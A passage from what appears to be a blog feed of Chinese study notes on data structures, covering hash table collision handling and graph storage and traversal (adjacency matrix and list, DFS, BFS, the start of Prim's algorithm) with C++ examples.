n-1$</p><p>二次聚集：两个本来不冲突的非同义词，发生争夺同一个散列地址的现象称为二次聚集或堆积</p><p>开放地址法不会引起堆积现象</p><p>1利用散列函数计算出关键字为K的地址，d=H(K)如果F[d].key==K,查找成功，返回d；</p><p>2.如果F[d].key!=K，依次查找F[(d+i)%n].key,直到找到某个F[(d+j)%n].key==K，返回(d+j)%n，或者找到一个开放地址为止，或者又回到F[d]，此时则表示没找到</p><p>2.二次探测再散列法：若H(key)=d的单元发生冲突，则按照下列方法进行探查：</p><p>$h_i$(k)=(h(k)+$d_i$)%n n是散列表长度</p><p>$d_i$=$1^2$,$-1^2$,$2^2$,$-2^2$,…,$+k^2$,$-k^2$  ($k\leqslant n/2$)</p><p>$d_i$为伪随机序列，称伪随机探测再散列</p><p>3.再哈希法</p><p>设置多个哈希函数，冲突时顺序用下一个</p><h5 id="链地址法"><a href="#链地址法" class="headerlink" title="链地址法"></a>链地址法</h5><p>1.根据关键字K找到关键字为K的结点所在的单链表的手地址</p><p>2.在所找到的单链表上进行顺序查找，若找到，返回地址，否则返回空值</p><p>一个哈希查找的例子</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNSUCCESS 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DUPLICATE -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NULLKEY INT_MAX</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> hashsize[]=&#123;<span class="number">13</span>&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ElemType</span>&#123;</span><br><span class="line">    <span class="type">int</span> key;</span><br><span class="line">&#125;ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    ElemType *elem;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="type">int</span> sizeindex;</span><br><span class="line">&#125;HashTable;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">isPre</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=<span class="built_in">sqrt</span>(n);i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(n%i==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">FindPre</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isPre</span>(n)) <span class="keyword">return</span> n;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            n--;</span><br><span class="line">        &#125;<span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Hash</span><span class="params">(KeyType key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> key%<span class="built_in">FindPre</span>(hashsize[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">collision</span><span class="params">(<span class="type">int</span> &amp;p,<span class="type">int</span> &amp;c)</span></span>&#123;</span><br><span class="line">    p=(p+c)%hashsize[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">SearchHash</span><span class="params">(HashTable H,KeyType K,<span class="type">int</span> &amp;p,<span class="type">int</span> &amp;c)</span></span>&#123;</span><br><span class="line">    p=<span class="built_in">Hash</span>(K);</span><br><span class="line">    <span class="keyword">while</span>(H.elem[p].key!=NULLKEY&amp;&amp;K!=H.elem[p].key)</span><br><span class="line">        <span class="built_in">collision</span>(p,++c);</span><br><span class="line">    <span class="keyword">if</span>(K==H.elem[p].key) <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> UNSUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    HashTable HT;</span><br><span class="line">    HT.count=<span class="number">13</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> c ,p;</span><br><span class="line">    HT.elem=(ElemType*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(ElemType)*<span class="number">13</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">13</span>;i++)&#123;</span><br><span class="line">        HT.elem[i].key=NULLKEY;</span><br><span class="line">    &#125;</span><br><span class="line">    HT.elem[<span class="number">0</span>].key=NULLKEY;</span><br><span class="line">    HT.elem[<span class="number">1</span>].key=<span class="number">14</span>;</span><br><span class="line">    HT.elem[<span class="number">2</span>].key=<span class="number">1</span>;</span><br><span class="line">    HT.elem[<span class="number">3</span>].key=<span class="number">68</span>;</span><br><span class="line">    HT.elem[<span class="number">4</span>].key=<span class="number">27</span>;</span><br><span class="line">    HT.elem[<span class="number">5</span>].key=<span class="number">54</span>;</span><br><span class="line">    HT.elem[<span class="number">6</span>].key=<span class="number">19</span>;</span><br><span class="line">    HT.elem[<span class="number">7</span>].key=<span class="number">20</span>;</span><br><span class="line">    HT.elem[<span class="number">8</span>].key=<span class="number">84</span>;</span><br><span class="line">    HT.elem[<span class="number">9</span>].key=NULLKEY;</span><br><span class="line">    HT.elem[<span class="number">10</span>].key=<span class="number">23</span>;</span><br><span class="line">    HT.elem[<span class="number">11</span>].key=<span class="number">11</span>;</span><br><span class="line">    HT.elem[<span class="number">12</span>].key=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">13</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(HT.elem[i].key==NULLKEY)&#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;@&quot;</span>&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;HT.elem[i].key&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    c=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">SearchHash</span>(HT, <span class="number">23</span>, p, c);</span><br><span class="line">    cout&lt;&lt;p&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>几种不同处理冲突方法的平均查找长度：</p><p><img src="/2023/11/21/平均查找长度比较.png" alt="平均查找长度比较"></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构】 图</title>
      <link href="/2023/11/21/"/>
      <url>/2023/11/21/</url>
      
        <content type="html"><![CDATA[<h3 id="图的定义和术语"><a href="#图的定义和术语" class="headerlink" title="图的定义和术语"></a>图的定义和术语</h3><h4 id="图的定义"><a href="#图的定义" class="headerlink" title="图的定义"></a>图的定义</h4><p>图G由两个集合构成，记作<code>G=&lt;V,E&gt;</code> ，其中V是顶点的非空有限集合，E是边的有限集合，其中边是顶点的无序对或有序对集合。</p><h4 id="图的术语"><a href="#图的术语" class="headerlink" title="图的术语"></a>图的术语</h4><p>无向图：若图G中所有边是无向边，则G为无向图</p><p>有向图：若所有边是有向边，则G为有向图；有向边被称作弧。</p><p>无向完全图：无向图且边数为n(n-1)/2</p><p>有向完全图：有向图且边数为n(n-1)</p><p>邻接点：边的两个顶点</p><p>关联边：若边e=(v,u)，则称顶点v，u关联边e</p><p>顶点的度：一个顶点的度是与它关联的边的条数</p><p>入度：以该顶点为终点的有向边的条数，ID(v)</p><p>出度：以该顶点为起点的有向边的条数，OD(v)</p><p><strong>顶点数、边数e、和度数D(v)的关系</strong>：e=$\sum_{i=1}^nD(V_i)$/2</p><p>无向图的路径、回路：</p><p>无向图G=(V,E)中的顶点序列$v_1$,$v_2$,…,$v_k$,若($v_i$,$v_{i+1}$) $\in$ E(i=1,2,…,k-1),$v=v_1$,$u=v_k$,则称该序列是从v到u的路径；若v=u，则该序列称为回路。</p><p>有向图的路径、回路：</p><p>有向图G=(V,E)中的顶点序列$v_1$,$v_2$,…,$v_k$,若&lt;$v_i$,$v_{i+1}$&gt; $\in$ E(i=1,2,…,k-1),$v=v_1$,$u=v_k$,则称该序列是从v到u的路径；若v=u，则该序列称为回路。</p><p>简单路径：序列顶点中不重复出现的路径</p><p>简单回路/环：在一条路径中，除起点和终点外所有顶点各不相同</p><p>连通图：在无向图G=<V,E>中，若对于任何两个顶点v,u都存在v到u的路径，则称G是连通图。</V,E></p><p>强连通图：在有向图G=<V,E>中，若对于任何两个顶点v,u都存在v到u的路径，则称G是连通图。</V,E></p><p>子图：设有两个图G=(V,E)、$G_1=(V_1,E_1)$，若$V_1$ $\subseteq$V，$E_1$ $\subseteq$E，$E_1$关联的顶点都在$V_1$中，称$G_1$是G的子图。</p><p>连通分量：无向图中的极大连通子图</p><p>强连通分量：有向图中的极大强连通子图</p><p>网络(边带权图)：某些图的边具有与它相关的数，称为权，这种带权图叫网络</p><p>生成树：连通图的一个子图如果是一棵包含G所有顶点的树，则称为图G的生成树</p><p><img src="/2023/11/21/图分类.png" alt="图分类"></p><h4 id="图的抽象数据类型定义"><a href="#图的抽象数据类型定义" class="headerlink" title="图的抽象数据类型定义"></a>图的抽象数据类型定义</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ADT Graph&#123;</span><br><span class="line">数据对象V:V是具有相同特性的元素的集合称为顶点集。</span><br><span class="line">数据关系: R=&#123;VR&#125;</span><br><span class="line"> VR=&#123;&lt;v,w&gt;|v,w属于V且P(v,w),&lt;v,w&gt;表示从v到w的弧&#125;</span><br><span class="line">基本操作:</span><br><span class="line">  CreateGraph(&amp;G)<span class="comment">//建立图</span></span><br><span class="line">  DestoryGraph(&amp;G)<span class="comment">//销毁图</span></span><br><span class="line">  InsertVex(&amp;G,v)<span class="comment">//插入顶点</span></span><br><span class="line">  DeleteVex(&amp;G,v)<span class="comment">//删除顶点</span></span><br><span class="line">  DFSTraverse(G,v,visit())<span class="comment">//深度优先搜索</span></span><br><span class="line">  BFSTraverse(G,v,visit())  <span class="comment">//广度优先搜索</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="图的存储结构"><a href="#图的存储结构" class="headerlink" title="图的存储结构"></a>图的存储结构</h3><h4 id="数组表示法-邻接矩阵"><a href="#数组表示法-邻接矩阵" class="headerlink" title="数组表示法(邻接矩阵)"></a>数组表示法(邻接矩阵)</h4><p>G的邻接矩阵满足以下条件：</p><script type="math/tex; mode=display">A[i][j]=\begin{cases}1 ,若(v_i,v_j)\in E或<v_i,v_j>\in E\\0 ,否则\end{cases}</script><p>​    邻接矩阵中的元素A[i] [j]存放的是顶点i到顶点j的关系的信息。</p><h5 id="对于无向图"><a href="#对于无向图" class="headerlink" title="对于无向图"></a>对于无向图</h5><p>无向图的邻接矩阵特点：1.对称矩阵 2.对角线元素全0</p><p>无向图的第i个顶点的度怎么表示？ 第i行(或第i列)的非零元素个数之和</p><p>图的总度数：矩阵中非零元素个数之和</p><p>边数为总度数的一半。</p><h5 id="对于有向图"><a href="#对于有向图" class="headerlink" title="对于有向图"></a>对于有向图</h5><p>第i个顶点的出度和入度如何体现？</p><p>第i行的非零元个数之和为出度</p><p>第i列的非零元个数之和为入度</p><p>边数为非零元的个数</p><h5 id="网络的邻接矩阵"><a href="#网络的邻接矩阵" class="headerlink" title="网络的邻接矩阵"></a>网络的邻接矩阵</h5><script type="math/tex; mode=display">A[i][j]=\begin{cases}Wij ,若(v_i,v_j)\in E或<v_i,v_j>\in E\\\infty ,否则\end{cases}</script><p>对于无穷大，可以用INT_MAX表示(用一个特殊的数表示即可)</p><p>存储结构：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_VERTEX_NUM 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IFINITY INT_MAX</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRUE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FALSE 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;DG,DN,UDG,UDN&#125;GraphKind;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">VertexType</span>&#123;</span><br><span class="line">    <span class="type">char</span> id;</span><br><span class="line">  <span class="comment">//  string label;</span></span><br><span class="line">&#125;VRType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">InfoType</span> &#123;</span><br><span class="line">    <span class="type">int</span> weight; <span class="comment">// 用于存储边的权重</span></span><br><span class="line">&#125; InfoType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ArcCell</span>&#123;</span><br><span class="line">    <span class="type">int</span> adj;</span><br><span class="line">    InfoType *info;</span><br><span class="line">&#125;ArcCell,AdjMatrix[MAX_VERTEX_NUM][MAX_VERTEX_NUM];</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    VertexType vexs[MAX_VERTEX_NUM];<span class="comment">//顶点信息</span></span><br><span class="line">    AdjMatrix arcs;<span class="comment">//邻接矩阵</span></span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;<span class="comment">//顶点数，边数</span></span><br><span class="line">    GraphKind kind;<span class="comment">//图种</span></span><br><span class="line">    </span><br><span class="line">&#125;MGraph;</span><br></pre></td></tr></table></figure><p>创建图：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Creategraph</span><span class="params">(MGraph &amp;G)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,k;<span class="type">float</span> w;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;请输入顶点数，弧数，图类型:&quot;</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d,%d,%d&quot;</span>,&amp;G.vexnum,&amp;G.arcnum,&amp;G.kind);</span><br><span class="line">    <span class="comment">//构造顶点向量</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;++i)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;输入顶点名称:&quot;</span>;</span><br><span class="line">        cin&gt;&gt;G.vexs[i].id;</span><br><span class="line">       <span class="comment">// scanf(&quot;%d&quot;,&amp;G.vexs[i].id);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//初始化邻接矩阵</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;++i)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;G.vexnum;j++)&#123;</span><br><span class="line">            G.arcs[i][j].adj=IFINITY;</span><br><span class="line">            G.arcs[i][j].info=<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构造邻接矩阵</span></span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;G.arcnum;k++)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;输入邻接矩阵位置与权重:&quot;</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d,%d,%f&quot;</span>,&amp;i,&amp;j,&amp;w);</span><br><span class="line">        G.arcs[i][j].adj=w;</span><br><span class="line">        G.arcs[j][i].adj=w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h5><p>1.空间复杂度O($n^2$)</p><p>2.边或弧的插入和删除操作简单，但顶点的插入和删除操作不容易</p><h4 id="邻接表"><a href="#邻接表" class="headerlink" title="邻接表"></a>邻接表</h4><p>对于每个顶点，建立一个单链表，存储该顶点的所有邻接顶点和信息·。</p><h5 id="对于无向图-1"><a href="#对于无向图-1" class="headerlink" title="对于无向图"></a>对于无向图</h5><p>第i个顶点的总度数为边链表的结点的个数</p><p>图的总度数为所有边链表的结点个数之和。</p><p>边数即所有边链表的结点个数之和的<strong>一半</strong></p><h5 id="邻接表的定义"><a href="#邻接表的定义" class="headerlink" title="邻接表的定义"></a>邻接表的定义</h5><p>邻接表分为两部分，边链表和顶点表</p><p>存储结构：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_VERTEX_NUM 20</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;DG,DN,UDG,UDN&#125;GraphKind;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">InfoType</span> &#123;</span><br><span class="line">    <span class="type">int</span> weight;</span><br><span class="line">&#125;InfoType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">vertextype</span>&#123;</span><br><span class="line">    <span class="type">char</span> id;</span><br><span class="line"> <span class="comment">//   string label;</span></span><br><span class="line">&#125;vertextype;</span><br><span class="line"><span class="comment">//边表的存储结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ArcNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> adjvex; <span class="comment">//该弧指向的顶点位置</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ArcNode</span> *nextarc;</span><br><span class="line">    InfoType *info;</span><br><span class="line">&#125;ArcNode;</span><br><span class="line"><span class="comment">//顶点表的存储结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">vnode</span>&#123;</span><br><span class="line">    vertextype data;</span><br><span class="line">    ArcNode *firstarc;</span><br><span class="line">&#125;vnode,adjlist[MAX_VERTEX_NUM];</span><br><span class="line"><span class="comment">//邻接表的存储结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    adjlist vertices;</span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;</span><br><span class="line">    GraphKind kind;</span><br><span class="line">&#125;ALGraph;</span><br></pre></td></tr></table></figure><p>创建图：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Creatadilist</span><span class="params">(ALGraph &amp;G)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,k;</span><br><span class="line">    ArcNode *s;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d,%d,%d&quot;</span>,&amp;G.vexnum,&amp;G.arcnum,&amp;G.kind);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        cin&gt;&gt;G.vertices[i].data.id;</span><br><span class="line">        G.vertices[i].firstarc=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;G.arcnum;k++)&#123;</span><br><span class="line">        cin&gt;&gt;i&gt;&gt;j;</span><br><span class="line">        s=(ArcNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(ArcNode));</span><br><span class="line">        s-&gt;adjvex=j;</span><br><span class="line">        s-&gt;info=<span class="literal">NULL</span>;</span><br><span class="line">        s-&gt;nextarc=G.vertices[i].firstarc;</span><br><span class="line">        G.vertices[i].firstarc=s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h5><p>1.空间复杂度O(n+e)</p><p>2.容易找到任意一个顶点的第一个邻接点</p><h3 id="图的遍历"><a href="#图的遍历" class="headerlink" title="图的遍历"></a>图的遍历</h3><p>图的遍历指，从图的某一顶点出发，访问图中所有顶点，且每个顶点仅访问一次</p><h4 id="深度优先搜索"><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h4><h5 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h5><p>1.首先访问图中某一个顶点$V_1$，以该点为出发点</p><p>2.任选一个与顶点$V_i$邻接的未被访问的顶点$V_j$，访问$V_j$</p><p>3.以$V_j$为新的出发点继续进行深度优先搜索</p><h5 id="算法概要"><a href="#算法概要" class="headerlink" title="算法概要"></a>算法概要</h5><p>输入：图G，初始访问顶点v;</p><p>输出：图G的深度优先搜索序列；</p><p>1.访问v</p><p>2.改变v的访问标志</p><p>3.任选一个与v相邻又没被访问的顶点w</p><p>4.从w开始继续进行深度优先搜索</p><p>算法实现：</p><p>这里用邻接矩阵实现算法，传入的visit[]数组全部置0</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">DFS</span><span class="params">(MGraph G, <span class="type">int</span> v, <span class="type">bool</span> visited[])</span> </span>&#123;</span><br><span class="line">    visited[v] = TRUE;</span><br><span class="line">    cout &lt;&lt; G.vexs[v].id;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> w = <span class="number">0</span>; w &lt; G.vexnum; w++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (G.arcs[v][w].adj != <span class="number">-1</span> &amp;&amp; !visited[w]) &#123;</span><br><span class="line">            <span class="built_in">DFS</span>(G, w, visited);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="广度优先搜索"><a href="#广度优先搜索" class="headerlink" title="广度优先搜索"></a>广度优先搜索</h4><h5 id="基本思想-1"><a href="#基本思想-1" class="headerlink" title="基本思想"></a>基本思想</h5><p>1.首先访问图中某一个指定的出发点$v_i$,</p><p>2.然后一次访问$v_i$的所有邻接点$v_{i1}$,$v_{i2}$,$v_{i3}$…</p><p>3.再依次以$v_{i1}$,$v_{i2}$,$v_{i3}$…为顶点访问各顶点未被访问的邻接点，依次类推，直到图中所有顶点均被访问</p><h5 id="算法概要-1"><a href="#算法概要-1" class="headerlink" title="算法概要"></a>算法概要</h5><p>输入：图G，初始访问结点v</p><p>输出：图G的广度优先搜索序列</p><p>1.设置辅助队列Q，访问节点v，修改v的标志，v入队列</p><p>2.while(队列非空){</p><p>​    出队列节点u</p><p>​    访问与u的所有节点</p><p>​    修改与u邻接的所有结点的标志，与u邻接的所有结点入队列</p><p>}</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">QNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">QNode</span> *next;</span><br><span class="line">&#125;QNode,*QueuePtr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    QueuePtr front;</span><br><span class="line">    QueuePtr rear;</span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitQueue</span><span class="params">(LinkQueue &amp;Q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Q.front=Q.rear=(QNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(QNode));</span><br><span class="line">    <span class="keyword">if</span>(!Q.front)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    Q.front-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">EnQueue</span><span class="params">(LinkQueue &amp;Q,<span class="type">int</span> e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    QueuePtr p=(QNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(QNode));</span><br><span class="line">    <span class="keyword">if</span>(!p)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    p-&gt;data=e;</span><br><span class="line">    p-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    Q.rear-&gt;next=p;</span><br><span class="line">    Q.rear=p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DeQueue</span><span class="params">(LinkQueue &amp;Q,<span class="type">int</span> &amp;e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.rear==Q.front)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        QueuePtr p;</span><br><span class="line">        p=Q.front-&gt;next;</span><br><span class="line">        e=p-&gt;data;</span><br><span class="line">        Q.front-&gt;next=Q.front-&gt;next-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(Q.rear==p)</span><br><span class="line">            Q.rear=Q.front;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">QueueEmpty</span><span class="params">(LinkQueue Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">LinkQueue Q;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BFSTraVErse</span><span class="params">(ALGraph G,<span class="type">bool</span> visit[])</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> v;</span><br><span class="line">    <span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexnum;++v)&#123;</span><br><span class="line">        visit[v]=FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">InitQueue</span>(Q);</span><br><span class="line">    <span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexnum;++v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!visit[v])&#123;</span><br><span class="line">            visit[v]=TRUE;</span><br><span class="line">            cout&lt;&lt;G.vertices[v].data.id;</span><br><span class="line">            <span class="built_in">EnQueue</span>(Q, v);</span><br><span class="line">            <span class="keyword">while</span>(!<span class="built_in">QueueEmpty</span>(Q))&#123;</span><br><span class="line">                <span class="type">int</span> u,w;</span><br><span class="line">                ArcNode *p;</span><br><span class="line">                <span class="built_in">DeQueue</span>(Q, u);</span><br><span class="line">                <span class="keyword">for</span>(p=G.vertices[u].firstarc;p!=<span class="literal">NULL</span>;p=p-&gt;nextarc)<span class="comment">//将取出的u结点遍历</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(!visit[p-&gt;adjvex])</span><br><span class="line">                    &#123;</span><br><span class="line">                        w=p-&gt;adjvex;</span><br><span class="line">                        visit[w]=TRUE;</span><br><span class="line">                        <span class="built_in">EnQueue</span>(Q,w);</span><br><span class="line">                        cout&lt;&lt;G.vertices[w].data.id;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="图的连通性问题"><a href="#图的连通性问题" class="headerlink" title="图的连通性问题"></a>图的连通性问题</h3><h4 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h4><p>prim算法</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//该图输入为字符型顶点，权值为浮点数且不为0</span></span><br><span class="line"><span class="comment">//部分注释代码为调试函数</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_VERTEX_NUM 100</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ArcCell</span>&#123;</span><br><span class="line">    <span class="type">float</span> adj;      <span class="comment">//记录权值</span></span><br><span 